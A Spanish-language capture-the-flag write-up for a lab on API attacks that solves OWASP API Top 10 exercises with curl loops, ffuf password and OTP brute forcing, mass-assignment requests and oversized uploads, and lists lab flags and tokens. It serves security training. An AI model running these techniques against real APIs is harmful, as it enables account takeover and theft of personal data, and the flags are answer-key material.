# Api Attacks

## Introduction

### Introduction to Lab

1. **Interact with any endpoint and inspect the response headers; what is the name of the server that the web API uses?**

```
curl -I http://154.57.164.64:30154/swagger
```

<p align="center"> 
<img src="images/Api Attacks Practise kestrel.png" width="600" alt="Resultado de Nmap">
</p>

answer: **Kestrel**

2. **There is only one endpoint belonging to the Roles group. Submit its path.**

```
http://154.57.164.64:30154/swagger/index.html#/
```

<p align="center"> 
<img src="images/Api Attacks Practise api current-user.png" width="600" alt="Resultado de Nmap">
</p>

answer: **/api/v1/roles/current-user**

## OWASP API Security Top 10

**¿Qué es Swagger?**

Es una interfaz gráfica e interactiva para la documentación de APIs (basada en la especificación OpenAPI). Permite ver todos los endpoints disponibles de una aplicación y probarlos directamente desde el navegador enviando peticiones y viendo las respuestas sin necesidad de usar herramientas externas complejas.

### Broken Object Level Authorization

**¿Qué es una vulnerabilidad BOLA?**

BOLA (_Broken Object Level Authorization_), conocida popularmente como **IDOR** en arquitecturas web tradicionales, ocurre cuando una API expone un endpoint que recibe un identificador de objeto en la URL (por ejemplo, `/reports/1`). El problema radica en que **la aplicación comprueba si estás autenticado, pero olvida verificar si tienes permisos sobre ese objeto específico**, permitiéndote acceder a datos de otros usuarios simplemente cambiando el número del ID.

1. **Exploit another Broken Object Level Authorization vulnerability and submit the flag.**

Authenticate to with user `htbpentester2@pentestercompany.com` and password "<font color="#c00000">HTBPentester2</font>"

En primer lugar seleccionamos el siguiente endpoint **/api/v1/authentication/suppliers/sign-in** se introducirá las credenciales comentada por htb.

```
{
  "Email": "htbpentester2@pentestercompany.com",
  "Password": "HTBPentester2"
}
```

<p align="center"> 
<img src="images/Api Attacks Practise autentficaciona dasdas.png" width="600" alt="Resultado de Nmap">
</p>

Tras el inicio de sesión, se conseguirá sus cookies

```json
"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTc5MTQ1MzY3MCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.xraPnxwM9n63D4GkRF8sbdIkyqnU4yoqBO8HuErS1yuWZRA6xMOQr47BfE8AudTMdy1Fae-iw8I-HLFbT-4IvQ"
```

<p align="center"> 
<img src="images/Api Attacks Practise cookiesss.png" width="600" alt="Resultado de Nmap">
</p>

En segundo lugar, en el botón **Authorize** se escribirá las cookies.

<p align="center"> 
<img src="images/Api Attacks Practise cookiies boton authorize.png" width="600" alt="Resultado de Nmap">
</p>

Una vez autorizada, en tercer lugar, se sitúa en la pestaña **supliers** y se selecciona **/api/v1/suppliers/quarterly-reports/{ID}** y se prueba cualquier ID, por ejemplo, **1**. Esto ocurre porque hay confianza excesiva en el parámetro del ID. Los desarrolladores asumen que si el usuario tiene un token válido, puede ver cualquier recurso.

<p align="center"> 
<img src="images/Api Attacks Practise 1.png" width="600" alt="Resultado de Nmap">
</p>

En cuarto paso, se realiza un bucle de Bash automatizando la consulta e iterando del 1 al 20 mediante `curl` utilizando tu token de autorización, procesa la respuesta con `jq` y acumula todo el contenido en el archivo `reports.txt`. De este modo, evitas tener que hacer cada petición de forma manual y puedes escanear rápidamente de golpe todos los reportes recopilados en busca de la primera bandera (_flag_) de la práctica.

```
for ((i=1; i<=20; i++)); do curl -s -w "\n" -X 'GET' "http://154.57.164.73:32804/api/v1/suppliers/quarterly-reports/$i" -H 'accept: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTc5MTQ1MzY3MCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.xraPnxwM9n63D4GkRF8sbdIkyqnU4yoqBO8HuErS1yuWZRA6xMOQr47BfE8AudTMdy1Fae-iw8I-HLFbT-4IvQ' | jq >> reports.txt; done
```

answer: **HTB{e76651e1f516eb5d7260621c26754776}**

### Broken Athentication

1. **Exploit another Broken Authentication vulnerability to gain unauthorized access to the customer with the email 'MasonJenkins@ymail.com'. Retrieve their payment options data and submit the flag.**

Cred --> **`htbpentester3@hackthebox.com`**:**HTBPentester3**

La cuenta pertenece a un cliente, se utilizará el endpoint **/api/v1/authentication/customers/sign-in** para obtener un JWT y luego autenticarnos con él:

```
{
  "Email": "htbpentester3@hackthebox.com",
  "Password": "HTBPentester3"
}
```

<p align="center"> 
<img src="images/Api Attacks Practise token asdasdas.png" width="600" alt="Resultado de Nmap">
</p>

El token de la sesión:

```
"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjNAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiQ3VzdG9tZXJzX1VwZGF0ZUJ5Q3VycmVudFVzZXIiLCJDdXN0b21lcnNfR2V0IiwiQ3VzdG9tZXJzX0dldEFsbCJdLCJleHAiOjE3OTE0NTY3NTAsImlzcyI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIiLCJhdWQiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIn0.z6qO30tSGA_1vr_3ECbIrk41zkZBMnn0tDHdX1FzMPzm0XK9984vwGhNwW4KpPdiwSvMzsNpR-PzahDim-yX5g"
```

Se autentifica la sesión clicando en el botón **Authorize**

<p align="center"> 
<img src="images/Api Attacks Practise authortizead asdadad.png" width="600" alt="Resultado de Nmap">
</p>

Al consultar el endpoint **/api/v1/roles/current-user**, se observa que al usuario autenticado se le asignan los siguientes roles: **Customers_UpdateByCurrentUser**, **Customers_Get** y **Customers_GetAll**.

<p align="center"> 
<img src="images/Api Attacks Practise roles asdjkajsda.png" width="600" alt="Resultado de Nmap">
</p>

El rol "**Customers_GetAll**" permite el acceso al punto final "**/api/v1/customers**", que devuelve registros de todos los clientes. Este punto de acceso expone información sensible como direcciones de correo electrónico, números de teléfono y fechas de nacimiento. Si bien esto representa un problema de autorización, no permite directamente el acceso no autorizado a la cuenta.

<p align="center"> 
<img src="images/Api Attacks Practise customers asdasda.png" width="600" alt="Resultado de Nmap">
</p>

El que nos interesa sobre todo es del usuario **Mason Jenkins**

```json
"id": "53428a83-8591-4548-a553-c434ad76a61a",
      "name": "Mason Jenkins",
      "email": "MasonJenkins@ymail.com",
      "phoneNumber": "+44 7451 162707",
      "birthDate": "1985-09-16"
```

La inspección del punto de acceso `/api/v1/customers/current-user` muestra que permite a los usuarios autenticados actualizar los detalles de su perfil, incluyendo su contraseña:

<p align="center"> 
<img src="images/Api Attacks Practise currentuseradasa.png" width="600" alt="Resultado de Nmap">
</p>

Al intentar establecer una contraseña débil como "passw", la API rechaza la solicitud, indicando que se requiere una longitud mínima para la contraseña:

```
{
  "UpdatedCustomer": {
    "Name": "string",
    "Email": "user@example.com",
    "PhoneNumber": "11936283041809702067400509268425229818115028005865999215771225601",
    "BirthDate": "1998-10-08",
    "Password": "passw"
  }
}
```

<p align="center"> 
<img src="images/Api Attacks Practise errror passwdassda.png" width="600" alt="Resultado de Nmap">
</p>

Esta respuesta detalla la política de contraseñas, revelando que la API solo exige una longitud mínima. Cuando la contraseña se establece con un valor débil pero válido, como 123456, la actualización se realiza correctamente. Que el apartado **successStatus** sea **true** confirma la existencia de una política de contraseñas débil, lo que hace que los ataques de fuerza bruta y el uso indebido de credenciales sean posibles.

<p align="center"> 
<img src="images/Api Attacks Practise truee session.png" width="600" alt="Resultado de Nmap">
</p>

Para preparar las pruebas de fuerza bruta, se intenta un inicio de sesión inválido para observar el mensaje de error que devuelve el punto de autenticación:

<p align="center"> 
<img src="images/Api Attacks Practise invalidpaswfoasda.png" width="600" alt="Resultado de Nmap">
</p>

Se genera una lista personalizada de contraseñas, con una longitud de al menos seis caracteres, a partir de la lista "**xato-net-10-million-passwords-100000.txt**".

```
grep -E '^.{6,}$' /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100000.txt > xato_6plus.txt
```

Los intentos de fuerza bruta se realizan utilizando ffuf, eliminando las respuestas inválidas.

```
ffuf -w xato_6plus.txt:FUZZ -request req.txt -request-proto http -fr "Invalid Credentials"
```

Se evalúa la funcionalidad de restablecimiento de contraseña. Se inicia una solicitud de restablecimiento de OTP proporcionando la dirección de correo electrónico de la víctima `MasonJenkins@ymail.com`:

<p align="center"> 
<img src="images/Api Attacks Practise otp digito.png" width="600" alt="Resultado de Nmap">
</p>

El punto final de confirmación de restablecimiento de contraseña requiere un valor OTP:

```
/api/v1/authentication/customers/passwords/resets
```

Aunque el código OTP se envía a la víctima, la API no aplica límites de velocidad ni mecanismos de bloqueo. Dado que los valores del OTP suelen ser numéricos y cortos, un ataque de fuerza bruta es factible. Por tanto la idea es capturar esta petición con burpsuite y luego guardarla.

```
{
  "Email": "MasonJenkins@ymail.com",
  "OTP": "FUZZ",
  "NewPassword": "123456"
}
```

<p align="center"> 
<img src="images/Api Attacks Practise.png" width="600" alt="Resultado de Nmap">
</p>

Se genera una lista de códigos OTP de cuatro dígitos:

```
seq -w 0 9999 > otp.txt
```

Un intento de OTP no válido devuelve la siguiente respuesta:

```
{
  "SuccessStatus": false
}
```

Se realizará el siguiente comando, recuerda que antes hay que activar la opcion otp de la cuenta acudiendo a la endpoint  **/api/v1/authentication/customers/passwords/resets/email-otps** y escribiendo el correo **MasonJenkins@ymail.com**

```
ffuf -w otp.txt:FUZZ -request req.txt -request-proto http -fr "false"
```

<p align="center"> 
<img src="images/Api Attacks Practise 4825.png" width="600" alt="Resultado de Nmap">
</p>

Con el codigo otp ya aplicado iniciamos sesión en el siguiente endpoint **/api/v1/authentication/customers/sign-in** con el correo `MasonJenkins@ymail.com` y pass **123456** recién cambiada.

```
{
  "Email": "MasonJenkins@ymail.com",
  "Password": "123456"
}
```

Se obtendrá el siguiente toke de sesion, luego se autentificaría este token.

```json
eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Ik1hc29uSmVua2luc0B5bWFpbC5jb20iLCJleHAiOjE3OTE0NjE4ODksImlzcyI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIiLCJhdWQiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIn0.yrz2c-xhS1HDRhGVr44G85KWFI9N60qPpkuIWFNKKJOwPKe9hRyHaUy95QFf6GY-gXiuNq8-iIA8HSmT7OEvPA
```

Este endpoint **/api/v1/customers/current-user** está diseñado para consultar el perfil del **cliente que ha iniciado sesión actualmente**

```
{
  "UpdatedCustomer": {
    "id": "53428a83-8591-4548-a553-c434ad76a61a",
    "Name": "Mason Jenkins",
    "Email": "MasonJenkins@ymail.com",
    "PhoneNumber": "447451162707",
    "BirthDate": "1985-09-16",
    "Password": "123456"
  }
}
```

<p align="center"> 
<img src="images/Api Attacks Practise truee adslasdklaca.png" width="600" alt="Resultado de Nmap">
</p>

Este endpoint **/api/v1/customers/payment-options/current-user** se encarga de gestionar, listar o mostrar las **opciones de pago** (tarjetas, métodos de cobro, etc.) asociadas al usuario actual.

<p align="center"> 
<img src="images/Api Attacks Practise flag htbaapsiadb nkajsdn.png" width="600" alt="Resultado de Nmap">
</p>

answer: **HTB{115a6329120e9eff13c4ec6a63343ed1}**

### Broken Object Property Level Authorization

1. **Exploit another Excessive Data Exposure vulnerability and submit the flag.**

Authenticate to with user "`htbpentester5@hackthebox.com`" and password "**HTBPentester5**"

**/api/v1/authentication/customers/sign-in**

```
{
  "Email": "htbpentester5@hackthebox.com",
  "Password": "HTBPentester5"
}
```

Se obtiene el token de la sesión:

```{
json="eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjRAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJzX0dldCIsIlN1cHBsaWVyc19HZXRBbGwiXSwiZXhwIjoxNzkxNDY5NjUxLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.J2zhMo41YdQm-RZZH_sU4O_obosWRhu8ocTngjknKc5iyTbZH-at6VTfdagf4Nob1gCFiffHtaXycVEkXJV-3g"
}
```

Se consultar el endpoint **/api/v1/roles/current-user**, se revela que al usuario autenticado se le han asignado las siguientes roles:

<p align="center"> 
<img src="images/Api Attacks Practise roles adsasdfgwse.png" width="600" alt="Resultado de Nmap">
</p>

Para continuar con el siguiente paso, debes usar el endpoint de actualización de compañías (`PATCH /api/v1/supplier-companies`) para modificar el campo que otorga la exención de tarifas utilizando el identificador de tu empresa (`b75a7c76-e149-4ca7-9c55-d9fc4ffa87be`).

```
{
  "UpdatedSupplierCompany": {
    "SupplierCompanyID": "strings",
    "IsExemptedFromMarketplaceFee": 0,
    "CertificateOfIncorporationPDFFileURI": "string"
  }
}
```

Al invocar el endpoint GET **/api/v1/supplier-companies**, se devuelve una lista de proveedores que incluye propiedades confidenciales como: **id**, **name**, **email**, **isExemptedFromMarketplaceFee** y **certificateOfIncorporationPDFFileURI**. Al final de la lista se encontrará la flag.

```json
{
  "supplierCompanies": [
    {
      "id": "f9e58492-b594-4d82-a4de-16e4f230fce1",
      "name": "Global Solutions",
      "email": "supplier@globalsolutions.com",
      "isExemptedFromMarketplaceFee": 0,
      "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
    },
    {
      "id": "058ac1e5-3807-47f3-b546-cc069366f8f9",
      "name": "Prime Enterprises",
      "email": "supplier@primeenterprises.com",
      "isExemptedFromMarketplaceFee": 0,
      "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
    },
    {
      "id": "d0826865-6518-41e8-afb8-84bb35c701c0",
      "name": "Dynamic Ventures",
      "email": "supplier@dynamicventures.com",
      "isExemptedFromMarketplaceFee": 0,
      "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
    },
    {
      "id": "41fe90e0-0b8c-4da5-9ea3-f0c9f0853e79",
      "name": "Ultimate Holdings",
      "email": "supplier@ultimateholdings.com",
      "isExemptedFromMarketplaceFee": 0,
      "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
    },
    {
      "id": "36965e0c-3459-4d17-9fca-5a77a683997e",
      "name": "Universal Networks",
      "email": "supplier@universalnetworks.com",
      "isExemptedFromMarketplaceFee": 1,
      "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
    },
    {
      "id": "5feb65b1-0cdb-478c-aaca-5dc94782d2e0",
      "name": "NextGen Technologies",
      "email": "supplier@nextgentechnologies.com",
      "isExemptedFromMarketplaceFee": 0,
      "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
    },
    {
      "id": "96dcb320-5481-441b-8c36-95a300058bde",
      "name": "Pioneer Innovations",
      "email": "supplier@pioneerinnovations.com",
      "isExemptedFromMarketplaceFee": 0,
      "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
    },
    {
      "id": "4b669bb5-52e1-427b-8be9-81bd2de25ead",
      "name": "Sovereign Consulting",
      "email": "supplier@sovereignconsulting.com",
      "isExemptedFromMarketplaceFee": 0,
      "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
    },
    {
      "id": "354d9cf9-4df4-49c3-bc4a-e714e7016759",
      "name": "Futuristic Furniture",
      "email": "supplier@futuristicfurniture.com",
      "isExemptedFromMarketplaceFee": 0,
      "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
    },
    {
      "id": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
      "name": "PentesterCompany",
      "email": "supplier@pentestercompany.com",
      "isExemptedFromMarketplaceFee": 0,
      "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
    },
    {
      "id": "ccb287ef-83a6-423b-942a-089f87fa144c",
      "name": "HTB Academy",
      "email": "HTB{d759c70b5a9f6a392af78cc1eca9cdf0}",
      "isExemptedFromMarketplaceFee": 0,
      "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
    }
  ]
}
```

answer: **HTB{d759c70b5a9f6a392af78cc1eca9cdf0}**

2. **Exploit another Mass Assignment vulnerability and submit the flag.**

Authenticate to with user "`htbpentester7@hackthebox.com`" and password "**HTBPentester7**"

**/api/v1/authentication/suppliers/sign-in**

```
{
  "Email": "htbpentester7@hackthebox.com",
  "Password": "HTBPentester7"
}
```

El token de sesión: 

```json
eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjdAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiQ3VzdG9tZXJPcmRlcnNfR2V0QnlJRCIsIkN1c3RvbWVyT3JkZXJzX0NyZWF0ZSIsIkN1c3RvbWVyT3JkZXJJdGVtc19HZXQiLCJDdXN0b21lck9yZGVySXRlbXNfQ3JlYXRlIl0sImV4cCI6MTc5MTQ3OTUzMSwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.GJOsp-srgADajkub-lae-xwyDROPVLgiH7T15m8wmmyXJwpWC_oy57va3ugyYYu6Uck3R75u_FWU50ts9udbNA
```

 **/api/v1/roles/current-user** Los roles que tenemos:

- **`CustomerOrders_GetByID`**: Permite consultar o recuperar los detalles de una orden de cliente específica utilizando su identificador único (ID).
    
- **`CustomerOrders_Create`**: Concede la autorización para registrar y crear nuevas órdenes de compra o pedidos en el sistema.
    
- **`CustomerOrderItems_Get`**: Permite consultar los productos o elementos individuales que componen una orden específica.
    
- **`CustomerOrderItems_Create`**: Permite agregar o crear nuevos ítems dentro de una orden de cliente.

<p align="center"> 
<img src="images/Api Attacks Practise sadasdaf.png" width="600" alt="Resultado de Nmap">
</p>

Post **/api/v1/customers/orders**: Envía un identificador de cliente (`id`) para registrar y crear una nueva orden pedido asociada a ese cliente en el sistema.

```json
{
  "id": "f0fc768f-fea4-4b4c-bae6-b4aa9e607319"
}
```

**/api/v1/customers/orders/items**

Get **/api/v1/products**: Solicita al servidor la lista completa de productos disponibles los detalles del catálogo utilizando el ID de producto proporcionado

```
"id": "a923b706-0aaa-49b2-ad8d-21c97ff6fac7"
```

Post **/api/v1/customers/orders/items**: Añade nuevos elementos o productos a una orden de cliente ya existente, enviando un cuerpo JSON que especifica el identificador de la orden (`OrderID`), el producto elegido (`ProductID`), la cantidad y la suma neta (`NetSum`).

```
{
  "OrderID": "f0fc768f-fea4-4b4c-bae6-b4aa9e607319",
  "OrderItems": [
    {
      "ProductID": "a923b706-0aaa-49b2-ad8d-21c97ff6fac7",
      "Quantity": 1,
      "NetSum": 1
    }
  ]
}
```

<p align="center"> 
<img src="images/Api Attacks Practise htb.png" width="600" alt="Resultado de Nmap">
</p>

answer: **HTB{4d86794f82046e465ca29d91bdbe5bca}**

La vulnerabilidad: la API vincula ciegamente cada propiedad del cuerpo de la solicitud al modelo de objetos interno. Los campos Cantidad y Suma Neta están controlados por el usuario, lo que significa que un atacante podría establecer el precio en cero, asignar cantidades negativas o inyectar propiedades que la interfaz nunca expone (como DiscountPercentage o IsApproved). El servidor no impone una lista blanca de propiedades de entrada aceptables.

### Unrestricted Resource Consumption

El consumo descontrolado de recursos (_Unrestricted Resource Consumption_) es una vulnerabilidad de seguridad que ocurre cuando una aplicación o API permite a los usuarios realizar operaciones intensivas, repetitivas o costosas sin aplicar límites adecuados como cuotas, restricciones de velocidad (_rate limiting_ o paginación), lo que permite que un atacante sature el servidor, provoque una denegación de servicio o genere gastos económicos masivos al abusar de servicios externos de pago como pasarelas de SMS o correo.

1. **Exploit another Unrestricted Resource Consumption vulnerability and submit the flag.**

**/api/v1/authentication/suppliers/sign-in**

```
{
  "Email": "htbpentester8@pentestercompany.com",
  "Password": "HTBPentester8"
}
```

El token de sesión:

```json
{
  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjhAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0IiwiU3VwcGxpZXJDb21wYW5pZXNfVXBsb2FkQ2VydGlmaWNhdGVPZkluY29ycG9yYXRpb24iXSwiZXhwIjoxNzkxNDk2MjA5LCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.vWumMLZvzWDhQjWeYageEFkPpKvMcCsrBDg8Lg6nE0Tb_K44f6Ww3xtiK5Zblf40bnRGa_2UVVPVwy_8Jk44gw"
}
```

Se consulta los roles:

- **`SupplierCompanies_Get`**: Permite consultar o leer la información y los detalles registrados de las empresas proveedoras.
    
- **`SupplierCompanies_UploadCertificateOfIncorporation`**: Otorga la autorización necesaria para subir o adjuntar el certificado de incorporación o documentos legales oficiales de una empresa proveedora.

Tras la autorización mediante JWT, al consultar `/api/v1/roles/current-user` se observa que el usuario autenticado tiene los siguientes roles:

<p align="center"> 
<img src="images/Api Attacks Practise permisosadmaskld.png" width="600" alt="Resultado de Nmap">
</p>

Al revisar los puntos de acceso (endpoints) relacionados con "SupplierCompanies", se observa que solo uno está asociado al rol "**SupplierCompanies_UploadCertificateOfIncorporation**":

```
/api/v1/supplier-companies/certificates-of-incorporation POST
```

Este punto final permite a los proveedores cargar un **certificado de constitución** en formato PDF. La solicitud requiere tanto la carga de un archivo como un `CompanyID`.

Se `companyID`puede obtener a través de:

```
/api/v1/supplier-companies/current-user
```

Respuesta:

```
{
  "supplierCompany": {
    "id": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
    "name": "PentesterCompany",
    "email": "supplier@pentestercompany.com",
    "isExemptedFromMarketplaceFee": 0,
    "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
  }
}
```

<p align="center"> 
<img src="images/Api Attacks Practise apittaxckasdamadfd.png" width="600" alt="Resultado de Nmap">
</p>

Utilizando el ID de la empresa obtenido, primero generamos un archivo PDF de 30 MB que contiene datos aleatorios.

```
dd if=/dev/urandom of=certificateOfIncorporation.pdf bs=1M count=30
```

Luego subimos el archivo:

<p align="center"> 
<img src="images/Api Attacks Practise execyutwefadfasadfasf.png" width="600" alt="Resultado de Nmap">
</p>

La carga se realiza correctamente y la respuesta confirma tanto el tamaño del archivo como la ubicación de almacenamiento:

```json
{
  "successStatus": true,
  "fileURI": "file:///app/wwwroot/SupplierCompaniesCertificatesOfIncorporations/certificateOfIncorporation.pdf",
  "fileSize": 31457280
}
```

<p align="center"> 
<img src="images/Api Attacks Practise pdfsadsd.png" width="600" alt="Resultado de Nmap">
</p>

Esto demuestra que el punto final no aplica límites de tamaño de archivo. Sin medidas de seguridad adicionales, como la limitación de velocidad, un atacante podría subir repetidamente archivos grandes y agotar el espacio de almacenamiento disponible en disco, lo que provocaría condiciones de denegación de servicio y un aumento de los costos operativos. Para probar aún más la validación de entrada, intentamos subir un archivo que no sea PDF. Creamos un archivo ejecutable de 30 MB:

```
dd if=/dev/urandom of=reverse-shell.exe bs=1M count=30
```

A continuación, volvemos a enviar la solicitud de carga:

<p align="center"> 
<img src="images/Api Attacks Practise execacawsdad.png" width="600" alt="Resultado de Nmap">
</p>

La carga se realizó con éxito:

```json
{
  "successStatus": true,
  "fileURI": "file:///app/wwwroot/SupplierCompaniesCertificatesOfIncorporations/reverse-shell.exe",
  "fileSize": 31457280
}
```

Esto confirma que el punto final no valida el tipo ni el contenido del archivo. Si se cargara un ejecutable malicioso y posteriormente lo accediera un administrador o un proceso automatizado, esto podría resultar en la ejecución remota de código. Otro punto final vulnerable al consumo ilimitado de recursos es:

```
/api/v1/authentication/customers/passwords/resets/sms-otps
```

<p align="center"> 
<img src="images/Api Attacks Practise faseadasd.png" width="600" alt="Resultado de Nmap">
</p>

```bash
for ((i=1; i<20; i++)); do curl -X 'POST' 'http://154.57.164.81:30634/api/v1/authentication/customers/passwords/resets/sms-otps' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{"Email": "htbpentester8@pentestercompany.com"}'; done
```

<p align="center"> 
<img src="images/Api Attacks Practise faldfasmsd.png" width="600" alt="Resultado de Nmap">
</p>

answer: **HTB{01de742d8cd942ad682aeea9ce3c5428}**

### Broken Function Level Authorization

1. **Exploit another Broken Function Level Authorization vulnerability and submit the flag.**

Authenticate to with user "`htbpentester9@hackthebox.com`" and password "<font color="#c00000">HTBPentester9</font>"

La autenticación se realiza a través del punto final: **/api/v1/authentication/customers/sign-in**

```
{
  "Email": "htbpentester9@hackthebox.com",
  "Password": "HTBPentester9"
}
```

Tras la autorización con el JWT, al consultar **/api/v1/roles/current-user** se observa que el usuario autenticado no tiene roles asignados. 

Esto convierte a la cuenta en una candidata ideal para probar los controles de autorización a nivel de función, ya que solo debería poder acceder a los puntos finales que explícitamente no requieren roles. 

Enumeramos sistemáticamente los puntos finales de la API e identificamos el siguiente punto final de interés. Según la documentación de la API, este endpoint requiere el rol **ProductDiscounts_GetAll** Sin embargo, a pesar de carecer de esta función, al enviar una solicitud al punto final se devuelven datos de descuento para todos los productos:

<p align="center"> 
<img src="images/Api Attacks Practise 200adsasdaffg.png" width="600" alt="Resultado de Nmap">
</p>

Esto confirma una vulnerabilidad de autorización a nivel de función rota. 

Aunque el punto final está documentado como restringido, no se aplica ningún control de acceso basado en roles, lo que permite a usuarios no autorizados acceder a datos comerciales confidenciales, como tasas de descuento y períodos de campaña. 

La enumeración continua de puntos finales revela otro punto final vulnerable. Parece ser que el usuario tiene el rol **CustomerBillingAddresses_GetAll** A pesar de carecer de esta función, el punto final responde con las direcciones de facturación de todos los clientes:

<p align="center"> 
<img src="images/Api Attacks Practise 200awhga web.png" width="600" alt="Resultado de Nmap">
</p>

Esto expone información personal altamente sensible, incluyendo direcciones residenciales, a usuarios no autorizados. Al guardar la respuesta en un archivo y filtrar por la bandera se obtiene:

<p align="center"> 
<img src="images/Api Attacks PractisegrAJKA.png" width="600" alt="Resultado de Nmap">
</p>

```
grep -i "htb" billing-addresses.txt
```

answer: **HTB{1e2095c564baf0d2d316080217040dae}**

### Unrestricted Access to Sensitive Business Flows

1. **Based on the previous vulnerability, exploit the Unrestricted Access to Sensitive Business Flow vulnerability and submit the street address where the user with the ID 'daa8c984-ba84-4265-8d88-12d6607e511c' lives.**

Authenticate to 154.57.164.76 , with user "`htbpentester9@hackthebox.com`" and password "**HTBPentester9**"

```
{
  "Email": "htbpentester9@hackthebox.com",
  "Password": "HTBPentester9"
}
```

**/api/v1/customers/billing-addresses** devuelve el conjunto de datos completo sin autorización. La respuesta completa contiene direcciones de facturación para cada cliente del sistema.

<p align="center"> 
<img src="images/Api Attacks Practise cosasdvariasdascustomers.png" width="600" alt="Resultado de Nmap">
</p>

Si buscamos en el buscador de la pagina con el id **daa8c984-ba84-4265-8d88-12d6607e511c** se encontrará la calle donde vive.
